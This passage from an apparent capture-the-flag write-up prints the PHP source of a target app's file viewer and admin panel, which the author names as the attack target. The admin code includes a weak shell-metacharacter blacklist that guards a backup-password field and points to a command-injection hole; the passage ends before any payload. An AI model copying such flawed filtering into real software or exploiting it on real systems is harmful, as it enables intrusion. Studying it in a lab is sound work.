</span><span id="__span-16-57"><a id="__codelineno-16-57" name="__codelineno-16-57" href="#__codelineno-16-57"></a><span class="w">                </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;&lt;div class=&#39;error&#39;&gt;File not found on the server.&lt;/div&gt;&quot;</span><span class="p">;</span>
</span><span id="__span-16-58"><a id="__codelineno-16-58" name="__codelineno-16-58" href="#__codelineno-16-58"></a><span class="w">                </span>showAvailableFiles<span class="o">(</span><span class="nv">$user_id</span>,<span class="w"> </span><span class="nv">$db</span><span class="o">)</span><span class="p">;</span>
</span><span id="__span-16-59"><a id="__codelineno-16-59" name="__codelineno-16-59" href="#__codelineno-16-59"></a><span class="w">            </span><span class="o">}</span>
</span><span id="__span-16-60"><a id="__codelineno-16-60" name="__codelineno-16-60" href="#__codelineno-16-60"></a><span class="w">        </span><span class="o">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="o">{</span>
</span><span id="__span-16-61"><a id="__codelineno-16-61" name="__codelineno-16-61" href="#__codelineno-16-61"></a><span class="w">            </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;&lt;div class=&#39;error&#39;&gt;File does not exist.&lt;/div&gt;&quot;</span><span class="p">;</span>
</span><span id="__span-16-62"><a id="__codelineno-16-62" name="__codelineno-16-62" href="#__codelineno-16-62"></a><span class="w">            </span>showAvailableFiles<span class="o">(</span><span class="nv">$user_id</span>,<span class="w"> </span><span class="nv">$db</span><span class="o">)</span><span class="p">;</span>
</span><span id="__span-16-63"><a id="__codelineno-16-63" name="__codelineno-16-63" href="#__codelineno-16-63"></a><span class="w">        </span><span class="o">}</span>
</span><span id="__span-16-64"><a id="__codelineno-16-64" name="__codelineno-16-64" href="#__codelineno-16-64"></a><span class="w">    </span><span class="o">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="o">{</span>
</span><span id="__span-16-65"><a id="__codelineno-16-65" name="__codelineno-16-65" href="#__codelineno-16-65"></a><span class="w">        </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;&lt;div class=&#39;error&#39;&gt;User not found.&lt;/div&gt;&quot;</span><span class="p">;</span>
</span><span id="__span-16-66"><a id="__codelineno-16-66" name="__codelineno-16-66" href="#__codelineno-16-66"></a><span class="w">    </span><span class="o">}</span>
</span><span id="__span-16-67"><a id="__codelineno-16-67" name="__codelineno-16-67" href="#__codelineno-16-67"></a>
</span><span id="__span-16-68"><a id="__codelineno-16-68" name="__codelineno-16-68" href="#__codelineno-16-68"></a><span class="w">    </span><span class="k">function</span><span class="w"> </span>showAvailableFiles<span class="o">(</span><span class="nv">$user_id</span>,<span class="w"> </span><span class="nv">$db</span><span class="o">)</span><span class="w"> </span><span class="o">{</span>
</span><span id="__span-16-69"><a id="__codelineno-16-69" name="__codelineno-16-69" href="#__codelineno-16-69"></a><span class="w">        </span><span class="nv">$stmt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$db</span>-&gt;prepare<span class="o">(</span><span class="s1">&#39;SELECT file_name FROM uploads WHERE user_id = :user_id&#39;</span><span class="o">)</span><span class="p">;</span>
</span><span id="__span-16-70"><a id="__codelineno-16-70" name="__codelineno-16-70" href="#__codelineno-16-70"></a><span class="w">        </span><span class="nv">$stmt</span>-&gt;bindValue<span class="o">(</span><span class="s1">&#39;:user_id&#39;</span>,<span class="w"> </span><span class="nv">$user_id</span>,<span class="w"> </span>SQLITE3_INTEGER<span class="o">)</span><span class="p">;</span>
</span><span id="__span-16-71"><a id="__codelineno-16-71" name="__codelineno-16-71" href="#__codelineno-16-71"></a><span class="w">        </span><span class="nv">$result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$stmt</span>-&gt;execute<span class="o">()</span><span class="p">;</span>
</span><span id="__span-16-72"><a id="__codelineno-16-72" name="__codelineno-16-72" href="#__codelineno-16-72"></a>
</span><span id="__span-16-73"><a id="__codelineno-16-73" name="__codelineno-16-73" href="#__codelineno-16-73"></a><span class="w">        </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;&lt;h2&gt;Available files for download:&lt;/h2&gt;&quot;</span><span class="p">;</span>
</span><span id="__span-16-74"><a id="__codelineno-16-74" name="__codelineno-16-74" href="#__codelineno-16-74"></a><span class="w">        </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;&lt;ul&gt;&quot;</span><span class="p">;</span>
</span><span id="__span-16-75"><a id="__codelineno-16-75" name="__codelineno-16-75" href="#__codelineno-16-75"></a>
</span><span id="__span-16-76"><a id="__codelineno-16-76" name="__codelineno-16-76" href="#__codelineno-16-76"></a><span class="w">        </span><span class="k">while</span><span class="w"> </span><span class="o">(</span><span class="nv">$row</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$result</span>-&gt;fetchArray<span class="o">())</span><span class="w"> </span><span class="o">{</span>
</span><span id="__span-16-77"><a id="__codelineno-16-77" name="__codelineno-16-77" href="#__codelineno-16-77"></a><span class="w">            </span><span class="nv">$file_name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$row</span><span class="o">[</span><span class="s1">&#39;file_name&#39;</span><span class="o">]</span><span class="p">;</span>
</span><span id="__span-16-78"><a id="__codelineno-16-78" name="__codelineno-16-78" href="#__codelineno-16-78"></a><span class="w">            </span><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;&lt;li&gt;&lt;a href=&quot;view.php?username=&#39;</span><span class="w"> </span>.<span class="w"> </span>urlencode<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s1">&#39;username&#39;</span><span class="o">])</span><span class="w"> </span>.<span class="w"> </span><span class="s1">&#39;&amp;file=&#39;</span><span class="w"> </span>.<span class="w"> </span>urlencode<span class="o">(</span><span class="nv">$file_name</span><span class="o">)</span><span class="w"> </span>.<span class="w"> </span><span class="s1">&#39;&quot;&gt;&#39;</span><span class="w"> </span>.<span class="w"> </span>htmlspecialchars<span class="o">(</span><span class="nv">$file_name</span><span class="o">)</span><span class="w"> </span>.<span class="w"> </span><span class="s1">&#39;&lt;/a&gt;&lt;/li&gt;&#39;</span><span class="p">;</span>
</span><span id="__span-16-79"><a id="__codelineno-16-79" name="__codelineno-16-79" href="#__codelineno-16-79"></a><span class="w">        </span><span class="o">}</span>
</span><span id="__span-16-80"><a id="__codelineno-16-80" name="__codelineno-16-80" href="#__codelineno-16-80"></a>
</span><span id="__span-16-81"><a id="__codelineno-16-81" name="__codelineno-16-81" href="#__codelineno-16-81"></a><span class="w">        </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;&lt;/ul&gt;&quot;</span><span class="p">;</span>
</span><span id="__span-16-82"><a id="__codelineno-16-82" name="__codelineno-16-82" href="#__codelineno-16-82"></a><span class="w">    </span><span class="o">}</span>
</span><span id="__span-16-83"><a id="__codelineno-16-83" name="__codelineno-16-83" href="#__codelineno-16-83"></a><span class="w">    </span>?&gt;
</span><span id="__span-16-84"><a id="__codelineno-16-84" name="__codelineno-16-84" href="#__codelineno-16-84"></a>
</span><span id="__span-16-85"><a id="__codelineno-16-85" name="__codelineno-16-85" href="#__codelineno-16-85"></a>&lt;/div&gt;
</span><span id="__span-16-86"><a id="__codelineno-16-86" name="__codelineno-16-86" href="#__codelineno-16-86"></a>
</span><span id="__span-16-87"><a id="__codelineno-16-87" name="__codelineno-16-87" href="#__codelineno-16-87"></a>&lt;/body&gt;
</span><span id="__span-16-88"><a id="__codelineno-16-88" name="__codelineno-16-88" href="#__codelineno-16-88"></a>&lt;/html&gt;
</span></code></pre></div>
<ul>
<li>admin.php<br />
This page will be our target, as wee see a text box there, indicating that we can specify password to encrypt our backup, lets inspect its code too, to see if we can find how it works under the hood:<br />
<img alt="Pasted image 20250527175300" src="../MediaFiles/Pasted%20image%2020250527175300.png" /></li>
</ul>
<p><div class="language-shell highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>&lt;?php
</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>session_start<span class="o">()</span><span class="p">;</span>
</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a>
</span><span id="__span-17-4"><a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a><span class="k">if</span><span class="w"> </span><span class="o">(</span>!isset<span class="o">(</span><span class="nv">$_SESSION</span><span class="o">[</span><span class="s1">&#39;user_id&#39;</span><span class="o">])</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="o">(</span><span class="nv">$_SESSION</span><span class="o">[</span><span class="s1">&#39;username&#39;</span><span class="o">]</span><span class="w"> </span>!<span class="o">==</span><span class="w"> </span><span class="s1">&#39;admin&#39;</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nv">$_SESSION</span><span class="o">[</span><span class="s1">&#39;username&#39;</span><span class="o">]</span><span class="w"> </span>!<span class="o">==</span><span class="w"> </span><span class="s1">&#39;amanda&#39;</span><span class="o">))</span><span class="w"> </span><span class="o">{</span>
</span><span id="__span-17-5"><a id="__codelineno-17-5" name="__codelineno-17-5" href="#__codelineno-17-5"></a><span class="w">    </span>header<span class="o">(</span><span class="s1">&#39;Location: login.php&#39;</span><span class="o">)</span><span class="p">;</span>
</span><span id="__span-17-6"><a id="__codelineno-17-6" name="__codelineno-17-6" href="#__codelineno-17-6"></a><span class="w">    </span>exit<span class="o">()</span><span class="p">;</span>
</span><span id="__span-17-7"><a id="__codelineno-17-7" name="__codelineno-17-7" href="#__codelineno-17-7"></a><span class="o">}</span>
</span><span id="__span-17-8"><a id="__codelineno-17-8" name="__codelineno-17-8" href="#__codelineno-17-8"></a>
</span><span id="__span-17-9"><a id="__codelineno-17-9" name="__codelineno-17-9" href="#__codelineno-17-9"></a><span class="k">function</span><span class="w"> </span>sanitizeFilePath<span class="o">(</span><span class="nv">$filePath</span><span class="o">)</span><span class="w"> </span><span class="o">{</span>
</span><span id="__span-17-10"><a id="__codelineno-17-10" name="__codelineno-17-10" href="#__codelineno-17-10"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span>basename<span class="o">(</span><span class="nv">$filePath</span><span class="o">)</span><span class="p">;</span><span class="w"> </span>//<span class="w"> </span>Only<span class="w"> </span>gets<span class="w"> </span>the<span class="w"> </span>base<span class="w"> </span>name<span class="w"> </span>of<span class="w"> </span>the<span class="w"> </span>file
</span><span id="__span-17-11"><a id="__codelineno-17-11" name="__codelineno-17-11" href="#__codelineno-17-11"></a><span class="o">}</span>
</span><span id="__span-17-12"><a id="__codelineno-17-12" name="__codelineno-17-12" href="#__codelineno-17-12"></a>
</span><span id="__span-17-13"><a id="__codelineno-17-13" name="__codelineno-17-13" href="#__codelineno-17-13"></a>//<span class="w"> </span>List<span class="w"> </span>only<span class="w"> </span>PHP<span class="w"> </span>files<span class="w"> </span><span class="k">in</span><span class="w"> </span>a<span class="w"> </span>directory
</span><span id="__span-17-14"><a id="__codelineno-17-14" name="__codelineno-17-14" href="#__codelineno-17-14"></a><span class="k">function</span><span class="w"> </span>listPhpFiles<span class="o">(</span><span class="nv">$dir</span><span class="o">)</span><span class="w"> </span><span class="o">{</span>
</span><span id="__span-17-15"><a id="__codelineno-17-15" name="__codelineno-17-15" href="#__codelineno-17-15"></a><span class="w">    </span><span class="nv">$files</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>array_diff<span class="o">(</span>scandir<span class="o">(</span><span class="nv">$dir</span><span class="o">)</span>,<span class="w"> </span><span class="o">[</span><span class="s1">&#39;.&#39;</span>,<span class="w"> </span><span class="s1">&#39;..&#39;</span><span class="o">])</span><span class="p">;</span>
</span><span id="__span-17-16"><a id="__codelineno-17-16" name="__codelineno-17-16" href="#__codelineno-17-16"></a><span class="w">    </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;&lt;ul class=&#39;file-list&#39;&gt;&quot;</span><span class="p">;</span>
</span><span id="__span-17-17"><a id="__codelineno-17-17" name="__codelineno-17-17" href="#__codelineno-17-17"></a><span class="w">    </span>foreach<span class="w"> </span><span class="o">(</span><span class="nv">$files</span><span class="w"> </span>as<span class="w"> </span><span class="nv">$file</span><span class="o">)</span><span class="w"> </span><span class="o">{</span>
</span><span id="__span-17-18"><a id="__codelineno-17-18" name="__codelineno-17-18" href="#__codelineno-17-18"></a><span class="w">        </span><span class="nv">$sanitizedFile</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>sanitizeFilePath<span class="o">(</span><span class="nv">$file</span><span class="o">)</span><span class="p">;</span>
</span><span id="__span-17-19"><a id="__codelineno-17-19" name="__codelineno-17-19" href="#__codelineno-17-19"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="o">(</span>is_dir<span class="o">(</span><span class="nv">$dir</span><span class="w"> </span>.<span class="w"> </span><span class="s1">&#39;/&#39;</span><span class="w"> </span>.<span class="w"> </span><span class="nv">$sanitizedFile</span><span class="o">))</span><span class="w"> </span><span class="o">{</span>
</span><span id="__span-17-20"><a id="__codelineno-17-20" name="__codelineno-17-20" href="#__codelineno-17-20"></a><span class="w">            </span>//<span class="w"> </span>Recursively<span class="w"> </span>call<span class="w"> </span>to<span class="w"> </span>list<span class="w"> </span>files<span class="w"> </span>inside<span class="w"> </span>directories
</span><span id="__span-17-21"><a id="__codelineno-17-21" name="__codelineno-17-21" href="#__codelineno-17-21"></a><span class="w">            </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;&lt;li class=&#39;folder&#39;&gt;ðŸ“ &lt;strong&gt;&quot;</span><span class="w"> </span>.<span class="w"> </span>htmlspecialchars<span class="o">(</span><span class="nv">$sanitizedFile</span><span class="o">)</span><span class="w"> </span>.<span class="w"> </span><span class="s2">&quot;&lt;/strong&gt;&quot;</span><span class="p">;</span>
</span><span id="__span-17-22"><a id="__codelineno-17-22" name="__codelineno-17-22" href="#__codelineno-17-22"></a><span class="w">            </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;&lt;ul&gt;&quot;</span><span class="p">;</span>
</span><span id="__span-17-23"><a id="__codelineno-17-23" name="__codelineno-17-23" href="#__codelineno-17-23"></a><span class="w">            </span>listPhpFiles<span class="o">(</span><span class="nv">$dir</span><span class="w"> </span>.<span class="w"> </span><span class="s1">&#39;/&#39;</span><span class="w"> </span>.<span class="w"> </span><span class="nv">$sanitizedFile</span><span class="o">)</span><span class="p">;</span>
</span><span id="__span-17-24"><a id="__codelineno-17-24" name="__codelineno-17-24" href="#__codelineno-17-24"></a><span class="w">            </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;&lt;/ul&gt;&lt;/li&gt;&quot;</span><span class="p">;</span>
</span><span id="__span-17-25"><a id="__codelineno-17-25" name="__codelineno-17-25" href="#__codelineno-17-25"></a><span class="w">        </span><span class="o">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="o">(</span>pathinfo<span class="o">(</span><span class="nv">$sanitizedFile</span>,<span class="w"> </span>PATHINFO_EXTENSION<span class="o">)</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="s1">&#39;php&#39;</span><span class="o">)</span><span class="w"> </span><span class="o">{</span>
</span><span id="__span-17-26"><a id="__codelineno-17-26" name="__codelineno-17-26" href="#__codelineno-17-26"></a><span class="w">            </span>//<span class="w"> </span>Show<span class="w"> </span>only<span class="w"> </span>PHP<span class="w"> </span>files
</span><span id="__span-17-27"><a id="__codelineno-17-27" name="__codelineno-17-27" href="#__codelineno-17-27"></a><span class="w">            </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;&lt;li class=&#39;file&#39;&gt;ðŸ“„ &lt;a href=&#39;admin.php?view=&quot;</span><span class="w"> </span>.<span class="w"> </span>urlencode<span class="o">(</span><span class="nv">$sanitizedFile</span><span class="o">)</span><span class="w"> </span>.<span class="w"> </span><span class="s2">&quot;&#39;&gt;&quot;</span><span class="w"> </span>.<span class="w"> </span>htmlspecialchars<span class="o">(</span><span class="nv">$sanitizedFile</span><span class="o">)</span><span class="w"> </span>.<span class="w"> </span><span class="s2">&quot;&lt;/a&gt;&lt;/li&gt;&quot;</span><span class="p">;</span>
</span><span id="__span-17-28"><a id="__codelineno-17-28" name="__codelineno-17-28" href="#__codelineno-17-28"></a><span class="w">        </span><span class="o">}</span>
</span><span id="__span-17-29"><a id="__codelineno-17-29" name="__codelineno-17-29" href="#__codelineno-17-29"></a><span class="w">    </span><span class="o">}</span>
</span><span id="__span-17-30"><a id="__codelineno-17-30" name="__codelineno-17-30" href="#__codelineno-17-30"></a><span class="w">    </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;&lt;/ul&gt;&quot;</span><span class="p">;</span>
</span><span id="__span-17-31"><a id="__codelineno-17-31" name="__codelineno-17-31" href="#__codelineno-17-31"></a><span class="o">}</span>
</span><span id="__span-17-32"><a id="__codelineno-17-32" name="__codelineno-17-32" href="#__codelineno-17-32"></a>
</span><span id="__span-17-33"><a id="__codelineno-17-33" name="__codelineno-17-33" href="#__codelineno-17-33"></a>//<span class="w"> </span>View<span class="w"> </span>the<span class="w"> </span>content<span class="w"> </span>of<span class="w"> </span>the<span class="w"> </span>PHP<span class="w"> </span>file<span class="w"> </span><span class="k">if</span><span class="w"> </span>the<span class="w"> </span><span class="s1">&#39;view&#39;</span><span class="w"> </span>option<span class="w"> </span>is<span class="w"> </span>passed
</span><span id="__span-17-34"><a id="__codelineno-17-34" name="__codelineno-17-34" href="#__codelineno-17-34"></a><span class="k">if</span><span class="w"> </span><span class="o">(</span>isset<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s1">&#39;view&#39;</span><span class="o">]))</span><span class="w"> </span><span class="o">{</span>
</span><span id="__span-17-35"><a id="__codelineno-17-35" name="__codelineno-17-35" href="#__codelineno-17-35"></a><span class="w">    </span><span class="nv">$file</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>sanitizeFilePath<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s1">&#39;view&#39;</span><span class="o">])</span><span class="p">;</span>
</span><span id="__span-17-36"><a id="__codelineno-17-36" name="__codelineno-17-36" href="#__codelineno-17-36"></a><span class="w">    </span><span class="nv">$filePath</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>__DIR__<span class="w"> </span>.<span class="w"> </span><span class="s1">&#39;/&#39;</span><span class="w"> </span>.<span class="w"> </span><span class="nv">$file</span><span class="p">;</span>
</span><span id="__span-17-37"><a id="__codelineno-17-37" name="__codelineno-17-37" href="#__codelineno-17-37"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="o">(</span>file_exists<span class="o">(</span><span class="nv">$filePath</span><span class="o">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>pathinfo<span class="o">(</span><span class="nv">$filePath</span>,<span class="w"> </span>PATHINFO_EXTENSION<span class="o">)</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="s1">&#39;php&#39;</span><span class="o">)</span><span class="w"> </span><span class="o">{</span>
</span><span id="__span-17-38"><a id="__codelineno-17-38" name="__codelineno-17-38" href="#__codelineno-17-38"></a><span class="w">        </span><span class="nv">$content</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>htmlspecialchars<span class="o">(</span>file_get_contents<span class="o">(</span><span class="nv">$filePath</span><span class="o">))</span><span class="p">;</span>
</span><span id="__span-17-39"><a id="__codelineno-17-39" name="__codelineno-17-39" href="#__codelineno-17-39"></a><span class="w">    </span><span class="o">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="o">{</span>
</span><span id="__span-17-40"><a id="__codelineno-17-40" name="__codelineno-17-40" href="#__codelineno-17-40"></a><span class="w">        </span><span class="nv">$content</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;File not found or invalid path.&quot;</span><span class="p">;</span>
</span><span id="__span-17-41"><a id="__codelineno-17-41" name="__codelineno-17-41" href="#__codelineno-17-41"></a><span class="w">    </span><span class="o">}</span>
</span><span id="__span-17-42"><a id="__codelineno-17-42" name="__codelineno-17-42" href="#__codelineno-17-42"></a><span class="o">}</span>
</span><span id="__span-17-43"><a id="__codelineno-17-43" name="__codelineno-17-43" href="#__codelineno-17-43"></a>
</span><span id="__span-17-44"><a id="__codelineno-17-44" name="__codelineno-17-44" href="#__codelineno-17-44"></a><span class="k">function</span><span class="w"> </span>cleanEntry<span class="o">(</span><span class="nv">$entry</span><span class="o">)</span><span class="w"> </span><span class="o">{</span>
</span><span id="__span-17-45"><a id="__codelineno-17-45" name="__codelineno-17-45" href="#__codelineno-17-45"></a><span class="w">    </span><span class="nv">$blacklist_chars</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">[</span><span class="s1">&#39;;&#39;</span>,<span class="w"> </span><span class="s1">&#39;&amp;&#39;</span>,<span class="w"> </span><span class="s1">&#39;|&#39;</span>,<span class="w"> </span><span class="s1">&#39;$&#39;</span>,<span class="w"> </span><span class="s1">&#39; &#39;</span>,<span class="w"> </span><span class="s1">&#39;`&#39;</span>,<span class="w"> </span><span class="s1">&#39;{&#39;</span>,<span class="w"> </span><span class="s1">&#39;}&#39;</span>,<span class="w"> </span><span class="s1">&#39;&amp;&amp;&#39;</span><span class="o">]</span><span class="p">;</span>
</span><span id="__span-17-46"><a id="__codelineno-17-46" name="__codelineno-17-46" href="#__codelineno-17-46"></a>
</span><span id="__span-17-47"><a id="__codelineno-17-47" name="__codelineno-17-47" href="#__codelineno-17-47"></a><span class="w">    </span>foreach<span class="w"> </span><span class="o">(</span><span class="nv">$blacklist_chars</span><span class="w"> </span>as<span class="w"> </span><span class="nv">$char</span><span class="o">)</span><span class="w"> </span><span class="o">{</span>
</span><span id="__span-17-48"><a id="__codelineno-17-48" name="__codelineno-17-48" href="#__codelineno-17-48"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="o">(</span>strpos<span class="o">(</span><span class="nv">$entry</span>,<span class="w"> </span><span class="nv">$char</span><span class="o">)</span><span class="w"> </span>!<span class="o">==</span><span class="w"> </span><span class="nb">false</span><span class="o">)</span><span class="w"> </span><span class="o">{</span>
</span><span id="__span-17-49"><a id="__codelineno-17-49" name="__codelineno-17-49" href="#__codelineno-17-49"></a><span class="w">            </span><span class="k">return</span><span class="w"> </span>false<span class="p">;</span><span class="w"> </span>//<span class="w"> </span>Malicious<span class="w"> </span>input<span class="w"> </span>detected
</span><span id="__span-17-50"><a id="__codelineno-17-50" name="__codelineno-17-50" href="#__codelineno-17-50"></a><span class="w">        </span><span class="o">}</span>
</span><span id="__span-17-51"><a id="__codelineno-17-51" name="__codelineno-17-51" href="#__codelineno-17-51"></a><span class="w">    </span><span class="o">}</span>
</span><span id="__span-17-52"><a id="__codelineno-17-52" name="__codelineno-17-52" href="#__codelineno-17-52"></a>
</span><span id="__span-17-53"><a id="__codelineno-17-53" name="__codelineno-17-53" href="#__codelineno-17-53"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span>htmlspecialchars<span class="o">(</span><span class="nv">$entry</span>,<span class="w"> </span>ENT_QUOTES,<span class="w"> </span><span class="s1">&#39;UTF-8&#39;</span><span class="o">)</span><span class="p">;</span>
</span><span id="__span-17-54"><a id="__codelineno-17-54" name="__codelineno-17-54" href="#__codelineno-17-54"></a><span class="o">}</span>
</span><span id="__span-17-55"><a id="__codelineno-17-55" name="__codelineno-17-55" href="#__codelineno-17-55"></a>?&gt;
</span><span id="__span-17-56"><a id="__codelineno-17-56" name="__codelineno-17-56" href="#__codelineno-17-56"></a>
</span><span id="__span-17-57"><a id="__codelineno-17-57" name="__codelineno-17-57" href="#__codelineno-17-57"></a>&lt;!DOCTYPE<span class="w"> </span>html&gt;
</span><span id="__span-17-58"><a id="__codelineno-17-58" name="__codelineno-17-58" href="#__codelineno-17-58"></a>&lt;html<span class="w"> </span><span class="nv">lang</span><span class="o">=</span><span class="s2">&quot;en&quot;</span>&gt;
</span><span id="__span-17-59"><a id="__codelineno-17-59" name="__codelineno-17-59" href="#__codelineno-17-59"></a>&lt;head&gt;
</span><span id="__span-17-60"><a id="__codelineno-17-60" name="__codelineno-17-60" href="#__codelineno-17-60"></a><span class="w">    </span>&lt;meta<span class="w"> </span><span class="nv">charset</span><span class="o">=</span><span class="s2">&quot;UTF-8&quot;</span>&gt;
</span><span id="__span-17-61"><a id="__codelineno-17-61" name="__codelineno-17-61" href="#__codelineno-17-61"></a><span class="w">    </span>&lt;meta<span class="w"> </span><span class="nv">name</span><span class="o">=</span><span class="s2">&quot;viewport&quot;</span><span class="w"> </span><span class="nv">content</span><span class="o">=</span><span class="s2">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;
</span><span id="__span-17-62"><a id="__codelineno-17-62" name="__codelineno-17-62" href="#__codelineno-17-62"></a><span class="w">    </span>&lt;title&gt;Admin<span class="w"> </span>Panel&lt;/title&gt;
</span><span id="__span-17-63"><a id="__codelineno-17-63" name="__codelineno-17-63" href="#__codelineno-17-63"></a><span class="w">    </span>&lt;link<span class="w"> </span><span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&amp;display=swap&quot;</span><span class="w"> </span><span class="nv">rel</span><span class="o">=</span><span class="s2">&quot;stylesheet&quot;</span>&gt;
</span><span id="__span-17-64"><a id="__codelineno-17-64" name="__codelineno-17-64" href="#__codelineno-17-64"></a>
</span><span id="__span-17-65"><a id="__codelineno-17-65" name="__codelineno-17-65" href="#__codelineno-17-65"></a>&lt;/head&gt;
</span><span id="__span-17-66"><a id="__codelineno-17-66" name="__codelineno-17-66" href="#__codelineno-17-66"></a>&lt;body&gt;
</span><span id="__span-17-67"><a id="__codelineno-17-67" name="__codelineno-17-67" href="#__codelineno-17-67"></a><span class="w">    </span>&lt;div<span class="w"> </span><span class="nv">class</span><span class="o">=</span><span class="s2">&quot;container&quot;</span>&gt;
</span><span id="__span-17-68"><a id="__codelineno-17-68" name="__codelineno-17-68" href="#__codelineno-17-68"></a><span class="w">        </span>&lt;h1&gt;Admin<span class="w"> </span>Panel&lt;/h1&gt;
</span><span id="__span-17-69"><a id="__codelineno-17-69" name="__codelineno-17-69" href="#__codelineno-17-69"></a>
</span><span id="__span-17-70"><a id="__codelineno-17-70" name="__codelineno-17-70" href="#__codelineno-17-70"></a><span class="w">        </span>&lt;h2&gt;File<span class="w"> </span>Structure<span class="w"> </span><span class="o">(</span>PHP<span class="w"> </span>Files<span class="w"> </span>Only<span class="o">)</span>&lt;/h2&gt;
</span><span id="__span-17-71"><a id="__codelineno-17-71" name="__codelineno-17-71" href="#__codelineno-17-71"></a><span class="w">        </span>&lt;?php<span class="w"> </span>listPhpFiles<span class="o">(</span>__DIR__<span class="o">)</span><span class="p">;</span><span class="w"> </span>?&gt;
</span><span id="__span-17-72"><a id="__codelineno-17-72" name="__codelineno-17-72" href="#__codelineno-17-72"></a>
</span><span id="__span-17-73"><a id="__codelineno-17-73" name="__codelineno-17-73" href="#__codelineno-17-73"></a><span class="w">        </span>&lt;h2&gt;View<span class="w"> </span>File<span class="w"> </span>Content&lt;/h2&gt;
</span><span id="__span-17-74"><a id="__codelineno-17-74" name="__codelineno-17-74" href="#__codelineno-17-74"></a><span class="w">        </span>&lt;?php<span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="o">(</span>isset<span class="o">(</span><span class="nv">$content</span><span class="o">))</span><span class="w"> </span><span class="o">{</span><span class="w"> </span>?&gt;
</span><span id="__span-17-75"><a id="__codelineno-17-75" name="__codelineno-17-75" href="#__codelineno-17-75"></a><span class="w">            </span>&lt;pre&gt;&lt;?php<span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="nv">$content</span><span class="p">;</span><span class="w"> </span>?&gt;&lt;/pre&gt;
</span><span id="__span-17-76"><a id="__codelineno-17-76" name="__codelineno-17-76" href="#__codelineno-17-76"></a><span class="w">        </span>&lt;?php<span class="w"> </span><span class="o">}</span><span class="w"> </span>?&gt;
</span><span id="__span-17-77"><a id="__codelineno-17-77" name="__codelineno-17-77" href="#__codelineno-17-77"></a>
</span><span id="__span-17-78"><a id="__codelineno-17-78" name="__codelineno-17-78" href="#__codelineno-17-78"></a><span class="w">        </span>&lt;h2&gt;Create<span class="w"> </span>Backup&lt;/h2&gt;
</span><span id="__span-17-79"><a id="__codelineno-17-79" name="__codelineno-17-79" href="#__codelineno-17-79"></a><span class="w">        </span>&lt;form<span class="w"> </span><span class="nv">method</span><span class="o">=</span><span class="s2">&quot;POST&quot;</span>&gt;
</span><span id="__span-17-80"><a id="__codelineno-17-80" name="__codelineno-17-80" href="#__codelineno-17-80"></a><span class="w">            </span>&lt;label<span class="w"> </span><span class="k">for</span><span class="o">=</span><span class="s2">&quot;password&quot;</span>&gt;Enter<span class="w"> </span>Password<span class="w"> </span>to<span class="w"> </span>Protect<span class="w"> </span>Backup:&lt;/label&gt;
</span><span id="__span-17-81"><a id="__codelineno-17-81" name="__codelineno-17-81" href="#__codelineno-17-81"></a><span class="w">            </span>&lt;input<span class="w"> </span><span class="nv">type</span><span class="o">=</span><span class="s2">&quot;password&quot;</span><span class="w"> </span><span class="nv">name</span><span class="o">=</span><span class="s2">&quot;password&quot;</span><span class="w"> </span>required<span class="w"> </span><span class="nv">placeholder</span><span class="o">=</span><span class="s2">&quot;Enter backup password&quot;</span>&gt;
